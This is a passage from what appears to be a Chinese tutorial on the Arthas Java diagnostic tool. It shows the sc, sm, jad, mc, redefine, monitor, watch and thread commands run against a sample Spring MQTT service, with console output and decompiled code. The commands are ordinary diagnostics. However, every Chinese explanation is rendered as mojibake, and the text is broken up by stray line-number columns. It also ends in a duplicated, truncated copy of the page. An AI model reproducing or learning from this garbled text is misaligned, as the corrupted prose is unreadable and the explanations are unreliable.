com.cloud*\ncom.cloud.mqtt.MqttApplication\ncom.cloud.mqtt.MqttApplication$$EnhancerBySpringCGLIB$$b4fbeb8a\ncom.cloud.mqtt.mqtt.MqttConfig\ncom.cloud.mqtt.mqtt.MqttConfig$$EnhancerBySpringCGLIB$$d1953d4e\ncom.cloud.mqtt.mqtt.MqttConfig$$EnhancerBySpringCGLIB$$d1953d4e$$FastClassBySpringCGLIB$$69e081d8\ncom.cloud.mqtt.mqtt.MqttConfig$$FastClassBySpringCGLIB$$bf72748c\ncom.cloud.mqtt.mqtt.MqttConfig$1\ncom.cloud.mqtt.mqtt.MqttReceiveConfig\ncom.cloud.mqtt.mqtt.MqttReceiveConfig$$EnhancerBySpringCGLIB$$5631a71d\ncom.cloud.mqtt.mqtt.MqttSenderConfig\ncom.cloud.mqtt.mqtt.MqttSenderConfig$$EnhancerBySpringCGLIB$$3bfb2a03\ncom.cloud.mqtt.mqtt.Publisher\ncom.cloud.mqtt.web.MqttGateway\ncom.cloud.mqtt.web.TestController\ncom.sun.proxy.$Proxy65\nAffect(row-cnt:15) cost in 20 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n\n\nç¤ºä¾ï¼sc -d -f com.cloud.mqtt.web.TestController æå°ç±»çä¿¡æ¯ä»¥åå­æ®µçä¿¡æ¯\n\n$ sc -d -f com.cloud.mqtt.web.TestController\n class-info        com.cloud.mqtt.web.TestController                                                                                                                                                                                    \n code-source       file:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/BOOT-INF/classes!/                                                                                                                                                 \n name              com.cloud.mqtt.web.TestController                                                                                                                                                                                    \n isInterface       false                                                                                                                                                                                                                \n isAnnotation      false                                                                                                                                                                                                                \n isEnum            false                                                                                                                                                                                                                \n isAnonymousClass  false                                                                                                                                                                                                                \n isArray           false                                                                                                                                                                                                                \n isLocalClass      false                                                                                                                                                                                                                \n isMemberClass     false                                                                                                                                                                                                                \n isPrimitive       false                                                                                                                                                                                                                \n isSynthetic       false                                                                                                                                                                                                                \n simple-name       TestController                                                                                                                                                                                                       \n modifier          public                                                                                                                                                                                                               \n annotation        org.springframework.web.bind.annotation.RestController,org.springframework.web.bind.annotation.RequestMapping                                                                                                        \n interfaces                                                                                                                                                                                                                             \n super-class       +-java.lang.Object                                                                                                                                                                                                   \n class-loader      +-org.springframework.boot.loader.LaunchedURLClassLoader@439f5b3d                                                                                                                                                    \n                     +-jdk.internal.loader.ClassLoaders$AppClassLoader@5bc2b487                                                                                                                                                         \n                       +-jdk.internal.loader.ClassLoaders$PlatformClassLoader@75d2da2d                                                                                                                                                  \n classLoaderHash   439f5b3d                                                                                                                                                                                                             \n fields            modifier  private                                                                                                                                                                                                    \n                   type      com.cloud.mqtt.web.MqttGateway                                                                                                                                                                                                      \n                   name      mqttGateway                                                                                                                                                                                                \n                   annotationjavax.annotation.Resource                                                                                                                                                                                  \n                                                                                                                                                                                                                                        \n\nAffect(row-cnt:1) cost in 15 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n\n\n\n# sm\n\næ¥çå·²å è½½ç±»çæ¹æ³ä¿¡æ¯ï¼å½ä»¤åªè½çå°ç±å½åç±»æå£°æ (declaring) çæ¹æ³ï¼ç¶ç±»åæ æ³çå°ã\nåæ°è¯´æï¼classï¼åå + ç±»åï¼ï¼methodï¼æ¹æ³åç§°ï¼ï¼[d]ï¼å±ç¤ºæ¯ä¸ªæ¹æ³çè¯¦ç»ä¿¡æ¯ï¼ï¼[E]ï¼å¼å¯æ­£åè¡¨è¾¾å¼å¹éï¼é»è®¤ä¸ºééç¬¦å¹éï¼\nç¤ºä¾ï¼sm com.cloud.mqtt.web.TestController æ¥è¯¢ TestController ä¸çæææ¹æ³\n\n$ sm  com.cloud.mqtt.web.TestController\ncom.cloud.mqtt.web.TestController <init>()V\ncom.cloud.mqtt.web.TestController test(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\ncom.cloud.mqtt.web.TestController sendMqtt(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\ncom.cloud.mqtt.web.TestController sendTest(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;\nAffect(row-cnt:4) cost in 12 ms.\n\n\n1\n2\n3\n4\n5\n6\n\n\nç¤ºä¾ï¼sm -d com.cloud.mqtt.web.TestController test æ¥è¯¢ TestController ä¸ç test æ¹æ³è¯¦æ\n\n$ sm -d com.cloud.mqtt.web.TestController test\n declaring-class  com.cloud.mqtt.web.TestController                                                                                                                                                                                     \n method-name      test                                                                                                                                                                                                                  \n modifier         public                                                                                                                                                                                                                \n annotation       org.springframework.web.bind.annotation.GetMapping                                                                                                                                                                    \n parameters       java.lang.String                                                                                                                                                                                                      \n                  java.lang.String                                                                                                                                                                                                      \n return           java.lang.String                                                                                                                                                                                                      \n exceptions                                                                                                                                                                                                                             \n\nAffect(row-cnt:1) cost in 13 ms.\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n\n\n\n# jad\n\njad åç¼è¯æå®å·²å è½½ç±»å¾æºç ï¼jad å¨ Arthas Console ä¸ï¼åç¼è¯åºæ¥å¾æºç æ¯å¸¦è¯­æ³é«äº®å¾ï¼éè¯»æ¹ä¾¿ï¼å½ç¶åç¼è¯åºæ¥å¾ java ä»£ç å¯è½ä¼å­å¨è¯­æ³éè¯¯ï¼ä½ä¸å½±åä½ çè¿è¡éè¯»ã\nåæ°è¯´æï¼classï¼åå + ç±»åï¼ï¼[c:]ï¼ç±»æå± ClassLoader å¾ hashcodeï¼ï¼[E]ï¼å¼å¯æ­£åè¡¨è¾¾å¹éï¼é»è®¤ééç¬¦ï¼\nç¤ºä¾ï¼åç¼è¯ com.cloud.mqtt.web.TestController\n\n$ jad com.cloud.mqtt.web.TestController\n\nClassLoader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.LaunchedURLClassLoader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.ClassLoaders$AppClassLoader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.ClassLoaders$PlatformClassLoader@75d2da2d                                                                                                                                                                     \n\nLocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/BOOT-INF/classes!/                                                                                                                                                                    \n\n/*\n * Decompiled with CFR 0_132.\n * \n * Could not load the following classes:\n *  com.cloud.mqtt.web.MqttGateway\n *  javax.annotation.Resource\n *  org.springframework.web.bind.annotation.GetMapping\n *  org.springframework.web.bind.annotation.RequestMapping\n *  org.springframework.web.bind.annotation.RequestParam\n *  org.springframework.web.bind.annotation.RestController\n */\npackage com.cloud.mqtt.web;\n\nimport com.cloud.mqtt.web.MqttGateway;\nimport javax.annotation.Resource;\nimport org.springframework.web.bind.annotation.GetMapping;\nimport org.springframework.web.bind.annotation.RequestMapping;\nimport org.springframework.web.bind.annotation.RequestParam;\nimport org.springframework.web.bind.annotation.RestController;\n\n@RestController\n@RequestMapping(value={"/test"})\npublic class TestController {\n    @Resource\n    private MqttGateway mqttGateway;\n\n    @GetMapping(value={"/"})\n    public String test(String a, String b) {\n        String rt = a + b;\n        return rt;\n    }\n\n    @GetMapping(value={"/send"})\n    public String sendMqtt(@RequestParam(value="data") String data, @RequestParam(value="topic") String topic) {\n        String rt = "sendMqtt";\n        return rt;\n    }\n\n    @GetMapping(value={"/sendTest"})\n    public String sendTest(@RequestParam(value="data") String data, @RequestParam(value="topic") String topic) {\n        String rt = "sendMqtt";\n        return "OK";\n    }\n}\n\nAffect(row-cnt:1) cost in 394 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n\n\nç¤ºä¾ï¼åç¼è¯ com.cloud.mqtt.web.TestController test æ¹æ³\n\n$ jad com.cloud.mqtt.web.TestController test\n\nClassLoader:                                                                                                                                                                                                                            \n+-org.springframework.boot.loader.LaunchedURLClassLoader@439f5b3d                                                                                                                                                                       \n  +-jdk.internal.loader.ClassLoaders$AppClassLoader@5bc2b487                                                                                                                                                                            \n    +-jdk.internal.loader.ClassLoaders$PlatformClassLoader@75d2da2d                                                                                                                                                                     \n\nLocation:                                                                                                                                                                                                                               \nfile:/home/fengqianrun/opt/server/mqtt-0.0.1.jar!/BOOT-INF/classes!/                                                                                                                                                                    \n\n@GetMapping(value={"/"})\npublic String test(String a, String b) {\n    String rt = a + b;\n    return rt;\n}\n\nAffect(row-cnt:1) cost in 67 ms.\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\n\n# mc\n\nåå­ç¼è¯å¨ï¼ç¼è¯.java æä»¶çæ.class æä»¶ãç¼è¯çæ.class ä¹åä»¬ï¼å¯ä»¥èå redefine å½ä»¤å®ç°ç­æ´æ°ä»£ç ã\nåæ°è¯´æï¼[c:]ï¼æå® classloaderï¼ï¼[d]ï¼æå®è¾åºç®å½ï¼\n\nmc /tmp/Test.java ç¼è¯Test.javaæä»¶\nmc -c 327a647b /tmp/Test.java æå®classloaderç¼è¯\nmc -d /tmp/output /tmp/ClassA.java /tmp/ClassB.java ç¼è¯å°æå®ç®å½\n\n\n1\n2\n3\n\n\n\n# redefine\n\nå è½½å¤é¨ç .class æä»¶å° redefine jvm å·²å è½½çç±»ã\nredefine åçåæ¥çç±»ä¸è½æ¢å¤ï¼redefine æå¯è½å¤±è´¥ï¼æ¯å¦å¢å äºæ°ç fieldï¼ï¼åè jdk æ¬èº«çææ¡£ã\nåæ°è¯´æï¼[c:]ï¼ClassLoader ç hashcodeï¼ï¼[p:]ï¼å¤é¨ç.class æä»¶çå®æ´è·¯å¾ï¼æ¯æå¤ä¸ªï¼\n\nredefine /tmp/Test.class\nç»å jad/mc å½ä»¤ä½¿ç¨ï¼\njad --source-only com.example.demo.arthas.user.UserController > /tmp/UserController.java\nmc /tmp/UserController.java -d /tmp\nredefine /tmp/com/example/demo/arthas/user/UserController.class\n- jadå½ä»¤åç¼è¯ï¼ç¶åå¯ä»¥ç¨å¶å®ç¼è¯å¨ï¼æ¯å¦vimæ¥ä¿®æ¹æºç \n- mcå½ä»¤æ¥åå­ç¼è¯ä¿®æ¹è¿çä»£ç \n- ç¨redefineå½ä»¤å è½½æ°çå­èç \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n\n\nredefine çéå¶ï¼ä¸åè®¸æ°å¢å  field/methodï¼æ­£å¨è·çå½æ°ï¼æ²¡æéåºä¸è½çæï¼æ¯å¦ä¸é¢æ°å¢å ç System.out.printlnï¼åªæ run () å½æ°éçä¼çæã\n\n\n# monitor\n\nmonitor æ¹æ³çæ§æ§è¡ï¼æ¯ä¸ä¸ªéå®æ¶å¾è¿åå½ä»¤ï¼ææå°±æ¯å¯ä»¥ä¸ç´çæ§æä¸ä¸ªæ¹æ³ï¼ç´å°ä½ æ ctrl+c ç»æä¸ºæ­¢ã\nçæ§å¾ä¿¡æ¯åæ¬ï¼timestamp (æ¶é´æ³)ï¼classï¼java ç±»ï¼ï¼methodï¼æ¹æ³ï¼åæ¬æé æ¹æ³åæ®éæ¹æ³ï¼ï¼totalï¼è°ç¨æ¬¡æ°ï¼ï¼successï¼æåæ¬¡æ°ï¼ï¼failï¼å¤±è´¥æ¬¡æ°ï¼ï¼rtï¼å¹³å RTï¼ï¼fail-rateï¼å¤±è´¥çï¼ã\næ¹æ³åæ°è¯´æï¼classï¼åå + ç±»åï¼ï¼methodï¼æ¹æ³åï¼ï¼[E]ï¼å¼å¯æ­£åè¡¨è¾¾å¹éï¼é»è®¤ééç¬¦ï¼ï¼[c:]ï¼å¾å°è¿è¡æ¥åå¾é´éæ¶é´ï¼é»è®¤æ¯ 120 ç§ï¼\n\n$ monitor -c 5 com.cloud.mqtt.web.TestController test\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 60 ms.\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:03  com.cloud.mqtt.web.TestController  test    6      6        0     0.34        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:08  com.cloud.mqtt.web.TestController  test    1      1        0     0.09        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:13  com.cloud.mqtt.web.TestController  test    0      0        0     0.00        0.00%                                                                                                                                \n\n timestamp            class                              method  total  success  fail  avg-rt(ms)  fail-rate                                                                                                                            \n-------------------------------------------------------------------------------------------------------------                                                                                                                           \n 2019-08-19 14:29:18  com.cloud.mqtt.web.TestController  test    0      0        0     0.00        0.00%            \n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n\n\næå¾ç±» com.cloud.mqtt.web.TestController ï¼æ¹æ³ä¸º test ï¼-c 5 å¾ææå°±æ¯æ¯ 5 ç§æå°ä¸æ¬¡ã\n\n\n# watch\n\nwatch æ¹æ³æ§è¡æ°æ®è§æµã\nåæ°è¯´æï¼classï¼ç±»åè¡¨è¾¾å¼å¹éï¼ï¼methodï¼æ¹æ³åè¡¨è¾¾å¼å¹éï¼ï¼expressï¼è§å¯è¡¨è¾¾å¼ï¼ï¼condition-expressï¼æ¡ä»¶è¡¨è¾¾å¼ï¼ï¼[b]ï¼å¨æ¹æ³è°ç¨ä¹åè§å¯ï¼ï¼[e]ï¼å¨æ¹æ³å¼å¸¸ä¹åè§å¯ï¼ï¼[s]ï¼å¨æ¹æ³è¿åä¹åè§å¯ï¼ï¼[f]ï¼å¨æ¹æ³ç»æä¹å (æ­£å¸¸è¿ååå¼å¸¸è¿å) è§å¯ï¼ï¼[E]ï¼å¼å¯æ­£åè¡¨è¾¾å¼å¹éï¼é»è®¤ä¸ºééç¬¦å¹éï¼ï¼[x:]ï¼æå®è¾åºç»æçå±æ§éåæ·±åº¦ï¼é»è®¤ä¸º 1ï¼\nç¹å«è¯´æï¼\n\n * watch å½ä»¤å®ä¹äº 4 ä¸ªè§å¯äºä»¶ç¹ï¼å³ -b æ¹æ³è°ç¨åï¼-e æ¹æ³å¼å¸¸åï¼-s æ¹æ³è¿ååï¼-f æ¹æ³ç»æå\n * 4 ä¸ªè§å¯äºä»¶ç¹ -bã-eã-s é»è®¤å³é­ï¼-f é»è®¤æå¼ï¼å½æå®è§å¯ç¹è¢«æå¼åï¼å¨ç¸åºäºä»¶ç¹ä¼å¯¹è§å¯è¡¨è¾¾å¼è¿è¡æ±å¼å¹¶è¾åº\n * è¿éè¦æ³¨ææ¹æ³å¥ååæ¹æ³åºåçåºå«ï¼æå¯è½å¨ä¸­é´è¢«ä¿®æ¹å¯¼è´ååä¸ä¸è´ï¼é¤äº -b äºä»¶ç¹ params ä»£è¡¨æ¹æ³å¥åå¤ï¼å¶ä½äºä»¶é½ä»£è¡¨æ¹æ³åºå\n * å½ä½¿ç¨ -b æ¶ï¼ç±äºè§å¯äºä»¶ç¹æ¯å¨æ¹æ³è°ç¨åï¼æ­¤æ¶è¿åå¼æå¼å¸¸åä¸å­å¨\n\ncurl "http://192.168.15.130:8087/test/?a=1&b=3" ï¼-x 2çæææ¯ï¼æ¯å¦æ·±åº¦è§£æåæ°ï¼å¦æä½ çåæ°æ¯ä¸ä¸ªå¯¹è±¡ï¼ä¸æ·±åº¦è§£æï¼ä½ çå°çåªæ¯å¯¹è±¡å°åï¼æ·±åº¦è§£æçå¼ï¼è·ä½ åæ°æåµå¥å±æ°æå³ã\n$ watch com.cloud.mqtt.web.TestController  test "{params,returnObj}" -x 2\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 41 ms.\nts=2019-08-19 17:02:09; [cost=0.241819ms] result=@ArrayList[\n    @Object[][\n        @String[1],\n        @String[3],\n    ],\n    @String[13],\n]\n\n-b æææ¯è§£æå¥åï¼-sè§£æåºåï¼ -n 2æ§è¡ä¸¤æ¬¡çææï¼2æ¬¡å®åç»æãç»æçè¾åºé¡ºåºåäºä»¶åççååé¡ºåºä¸è´ï¼åå½ä»¤ä¸­ -s -b çé¡ºåºæ å³ã\n$ watch com.cloud.mqtt.web.TestController  test "{params,returnObj}" -x 2 -b  -s -n 2\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:06:21; [cost=0.006941ms] result=@ArrayList[\n    @Object[][\n        @String[1],\n        @String[3],\n    ],\n    null,\n]\nts=2019-08-19 17:06:21; [cost=0.945661ms] result=@ArrayList[\n    @Object[][\n        @String[1],\n        @String[3],\n    ],\n    @String[13],\n]\nCommand execution times exceed limit: 2, so command will exit. You can set it with -n option.\n\næ¡ä»¶è¡¨è¾¾å¼ï¼ç¬¬ä¸ä¸ªä¼ åå¤§äº5ææ§è¡\n$ watch com.cloud.mqtt.web.TestController  test "{params[0],returnObj}" "params[0] > 5"\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 39 ms.\nts=2019-08-19 17:21:58; [cost=0.183399ms] result=@ArrayList[\n    @String[6],\n    @String[63],\n]\n\nå¼å¸¸ä¿¡æ¯ä¸¾ä¾ï¼-e è¡¨ç¤ºæåºå¼å¸¸æ¶æè§¦åï¼expressä¸­ï¼è¡¨ç¤ºå¼å¸¸ä¿¡æ¯çåéæ¯throwExp\n$ watch demo.MathGame primeFactors "{params[0],throwExp}" -e -x 2\nPress Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 62 ms.\nts=2018-12-03 19:38:00; [cost=1.414993ms] result=@ArrayList[\n    @Integer[-1120397038],\n    java.lang.IllegalArgumentException: number is: -1120397038, need >= 2\n    at demo.MathGame.primeFactors(MathGame.java:46)\n    at demo.MathGame.run(MathGame.java:24)\n    at demo.MathGame.main(MathGame.java:16),\n]\n\næç§èæ¶è¿è¡è¿æ»¤ï¼#cost>200(åä½æ¯ms)è¡¨ç¤ºåªæå½èæ¶å¤§äº200msæ¶æä¼è¾åºï¼è¿æ»¤ææ§è¡æ¶é´å°äº200msçè°ç¨\n$ watch demo.MathGame primeFactors \'{params, returnObj}\' \'#cost>200\' -x 2\n$ watch demo.MathGame primeFactors \'{params, returnObj}\' \'#cost>200\' -x 2\nPress Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 66 ms.\nts=2018-12-03 19:40:28; [cost=2112.168897ms] result=@ArrayList[\n    @Object[][\n        @Integer[2141897465],\n    ],\n    @ArrayList[\n        @Integer[5],\n        @Integer[428379493],\n    ],\n]\n\nè§å¯å½åå¯¹è±¡ä¸­çå±æ§ï¼å¦ææ³æ¥çæ¹æ³è¿è¡ååï¼å½åå¯¹è±¡ä¸­çå±æ§ï¼å¯ä»¥ä½¿ç¨targetå³é®å­ï¼ä»£è¡¨å½åå¯¹è±¡ï¼ç¶åä½¿ç¨target.field_nameè®¿é®å½åå¯¹è±¡çæä¸ªå±æ§\n$ watch com.cloud.mqtt.web.TestController  test \'target\'\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 47 ms.\nts=2019-08-19 17:27:09; [cost=0.450697ms] result=@TestController[\n    mqttGateway=@$Proxy65[gateway proxy for service interface [interface com.cloud.mqtt.web.MqttGateway]],\n]\n\n$ watch com.cloud.mqtt.web.TestController  test \'target.mqttGateway\'\nPress Q or Ctrl+C to abort.\nAffect(class-cnt:1 , method-cnt:1) cost in 46 ms.\nts=2019-08-19 17:28:31; [cost=0.352704ms] result=@$Proxy65[\n    m1=@Method[public boolean java.lang.Object.equals(java.lang.Object)],\n    m10=@Method[public abstract boolean org.springframework.aop.framework.Advised.isExposeProxy()],\n    m13=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvisor(org.springframework.aop.Advisor) throws org.springframework.aop.framework.AopConfigException],\n    m7=@Method[public abstract boolean org.springframework.aop.framework.Advised.isProxyTargetClass()],\n    m15=@Method[public abstract void org.springframework.aop.framework.Advised.removeAdvisor(int) throws org.springframework.aop.framework.AopConfigException],\n    m23=@Method[public abstract java.lang.Class[] org.springframework.aop.framework.Advised.getProxiedInterfaces()],\n    m5=@Method[public abstract int org.springframework.aop.framework.Advised.indexOf(org.springframework.aop.Advisor)],\n    m22=@Method[public abstract org.springframework.aop.TargetSource org.springframework.aop.framework.Advised.getTargetSource()],\n    m18=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvice(int,org.aopalliance.aop.Advice) throws org.springframework.aop.framework.AopConfigException],\n    m19=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvice(org.aopalliance.aop.Advice) throws org.springframework.aop.framework.AopConfigException],\n    m0=@Method[public native int java.lang.Object.hashCode()],\n    m24=@Method[public abstract boolean org.springframework.aop.framework.Advised.isInterfaceProxied(java.lang.Class)],\n    m20=@Method[public abstract boolean org.springframework.aop.framework.Advised.removeAdvice(org.aopalliance.aop.Advice)],\n    m9=@Method[public abstract void org.springframework.aop.framework.Advised.setExposeProxy(boolean)],\n    m8=@Method[public abstract void org.springframework.aop.framework.Advised.setTargetSource(org.springframework.aop.TargetSource)],\n    m2=@Method[public java.lang.String java.lang.Object.toString()],\n    m26=@Method[public abstract java.lang.Class org.springframework.aop.TargetClassAware.getTargetClass()],\n    m14=@Method[public abstract void org.springframework.aop.framework.Advised.addAdvisor(int,org.springframework.aop.Advisor) throws org.springframework.aop.framework.AopConfigException],\n    m27=@Method[public abstract java.lang.Class org.springframework.core.DecoratingProxy.getDecoratedClass()],\n    m16=@Method[public abstract boolean org.springframework.aop.framework.Advised.removeAdvisor(org.springframework.aop.Advisor)],\n    m4=@Method[public abstract int org.springframework.aop.framework.Advised.indexOf(org.aopalliance.aop.Advice)],\n    m6=@Method[public abstract boolean org.springframework.aop.framework.Advised.isFrozen()],\n    m17=@Method[public abstract boolean org.springframework.aop.framework.Advised.replaceAdvisor(org.springframework.aop.Advisor,org.springframework.aop.Advisor) throws org.springframework.aop.framework.AopConfigException],\n    m11=@Method[public abstract void org.springframework.aop.framework.Advised.setPreFiltered(boolean)],\n    m3=@Method[public abstract void com.cloud.mqtt.web.MqttGateway.sendToMqtt(java.lang.String,java.lang.String)],\n    m21=@Method[public abstract java.lang.String org.springframework.aop.framework.Advised.toProxyConfigString()],\n    m25=@Method[public abstract org.springframework.aop.Advisor[] org.springframework.aop.framework.Advised.getAdvisors()],\n    m12=@Method[public abstract boolean org.springframework.aop.framework.Advised.isPreFiltered()],\n]\n\n\n\n1\n2\n3\n4\n5\n6\n7\n8\n9\n10\n11\n12\n13\n14\n15\n16\n17\n18\n19\n20\n21\n22\n23\n24\n25\n26\n27\n28\n29\n30\n31\n32\n33\n34\n35\n36\n37\n38\n39\n40\n41\n42\n43\n44\n45\n46\n47\n48\n49\n50\n51\n52\n53\n54\n55\n56\n57\n58\n59\n60\n61\n62\n63\n64\n65\n66\n67\n68\n69\n70\n71\n72\n73\n74\n75\n76\n77\n78\n79\n80\n81\n82\n83\n84\n85\n86\n87\n88\n89\n90\n91\n92\n93\n94\n95\n96\n97\n98\n99\n100\n101\n102\n103\n104\n105\n106\n107\n108\n109\n110\n',normalizedContent:'# arthas æ¯ä»ä¹ï¼\n\narthas æ¯ alibaba å¼åå¾ä¸æ¬¾ java è¯æ­å·¥å·ï¼å¯ä»¥å¸®æä»¬æ¥ç jvm ä½¿ç¨æåµï¼æ¥ççº¿ç¨æ°ï¼æé¤é»å¡çº¿ç¨ï¼çå¬ç±»åæ¹æ³å¾è°ç¨æ¬¡æ°ï¼å¤±è´¥æ¬¡æ° (å¤±è´¥ç)ï¼æ§è¡æ¶å¸¸ï¼çå¬æ¹æ³å¾å¥åï¼åºåï¼å¼å¸¸ä¿¡æ¯ï¼å¿«éåç¼è¯æ¥çæºç ï¼å¹¶ä¿®æ¹æºç ï¼ç¼è¯è¿è¡ï¼æ¥çå æ ä¿¡æ¯ç­ã\n\n\n# è¿éååºä¸äºå¸¸ç¨å½ä»¤å¹¶ä¸ä¸è®²è§£\n\næå¸¸ç¨å¾å½ä»¤ï¼dashboardï¼threadï¼jvmï¼scï¼smï¼jadï¼mcï¼redefineï¼monitorï¼watchãå®æ¹å°åï¼https://arthas.aliyun.com/\n\n\n# dashboard\n\n\n\ndashboard å½åç³»ç»çå®æ¶æ°æ®é¢æ¿ï¼æ ctrl+c éåºï¼å½è¿è¡å¨ ali-tomcat æ¶ï¼ä¼æ¾ç¤ºå½å tomcat çå®æ¶ä¿¡æ¯ï¼å¦ http è¯·æ±ç qps, rt, éè¯¯æ°ï¼çº¿ç¨æ± ä¿¡æ¯ç­ç­ã\næ°æ®è¯´æå¦ä¸ï¼\n\n * id: java çº§å«ççº¿ç¨ idï¼æ³¨æè¿ä¸ª id ä¸è½è· jstack ä¸­ç nativeid ä¸ä¸å¯¹åº\n * name: çº¿ç¨å\n * group: çº¿ç¨ç»å\n * priority: çº¿ç¨ä¼åçº§ï¼1~10 ä¹é´çæ°å­ï¼è¶å¤§è¡¨ç¤ºä¼åçº§è¶é«\n * state: çº¿ç¨çç¶æ\n * cpu%: çº¿ç¨æ¶èç cpu å æ¯ï¼éæ · 100msï¼å°ææçº¿ç¨å¨è¿ 100ms åç cpu ä½¿ç¨éæ±åï¼åç®åºæ¯ä¸ªçº¿ç¨ç cpu ä½¿ç¨å æ¯ã\n * time: çº¿ç¨è¿è¡æ»æ¶é´ï¼æ°æ®æ ¼å¼ä¸º åï¼ç§\n * interrupted: çº¿ç¨å½åçä¸­æ­ä½ç¶æ\n * daemon: æ¯å¦æ¯å®æ¤çº¿ç¨\n\n\n# thread\n\næ¥çå½åçº¿ç¨ä¿¡æ¯ï¼æ¥ççº¿ç¨çå æ \nç¤ºä¾ï¼ thread -n 3 æ¾åºå 3 ä¸ªçº¿ç¨çå æ ä¿¡æ¯\n\n * id çº¿ç¨ id;\n * -n æå®æå¿çå n ä¸ªçº¿ç¨å¹¶æå°å æ ï¼\n * -b æ¾åºå½åé»å¡å¶ä»çº¿ç¨ççº¿ç¨ï¼\n * -i <value> æå® cpu å æ¯ç»è®¡çéæ ·é´éåä½ä¸ºæ¯«ç§ï¼å»ºè®® 5000\n\n$ thread -n 3\n"as-command-execute-daemon" id=58 cpuusage=76% runnable\n    at java.management@12.0.1/sun.management.threadimpl.dumpthreads0(native method)\n    at java.management@12.0.1/sun.management.threadimpl.getthreadinfo(threadimpl.java:466)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.processtopbusythreads(threadcommand.java:133)\n    at com.taobao.arthas.core.command.monitor200.threadcommand.process(threadcommand.java:79)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.process(annotatedcommandimpl.java:82)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl.access$100(annotatedcommandimpl.java:18)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:111)\n    at com.taobao.arthas.core.shell.command.impl.annotatedcommandimpl$processhandler.handle(annotatedcommandimpl.java:108)\n    at com.taobao.arthas.core.shell.system.impl.processimpl$commandprocesstask.run(processimpl.java:370)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1128)\n    at java.base@12.0.1/java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:628)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n    number of locked synchronizers = 1\n    - java.util.concurrent.threadpoolexecutor$worker@7808db3c\n\n\n"nioblockingselector.blockpoller-1" id=24 cpuusage=17% runnable (in native)\n    at java.base@12.0.1/sun.nio.ch.epoll.wait(native method)\n    at java.base@12.0.1/sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:124)\n    -  locked sun.nio.ch.util$2@1a574b17\n    -  locked sun.nio.ch.epollselectorimpl@7b0d44f5\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.select(selectorimpl.java:136)\n    at org.apache.tomcat.util.net.nioblockingselector$blockpoller.run(nioblockingselector.java:304)\n\n\n"http-nio-8087-clientpoller-1" id=36 cpuusage=5% runnable (in native)\n    at java.base@12.0.1/sun.nio.ch.epoll.wait(native method)\n    at java.base@12.0.1/sun.nio.ch.epollselectorimpl.doselect(epollselectorimpl.java:120)\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.lockanddoselect(selectorimpl.java:124)\n    -  locked sun.nio.ch.util$2@703ba4c0\n    -  locked sun.nio.ch.epollselectorimpl@6a6a92bd\n    at java.base@12.0.1/sun.nio.ch.selectorimpl.select(selectorimpl.java:136)\n    at org.apache.tomcat.util.net.nioendpoint$poller.run(nioendpoint.java:743)\n    at java.base@12.0.1/java.lang.thread.run(thread.java:835)\n\n\naffect(row-cnt:0) cost in 131 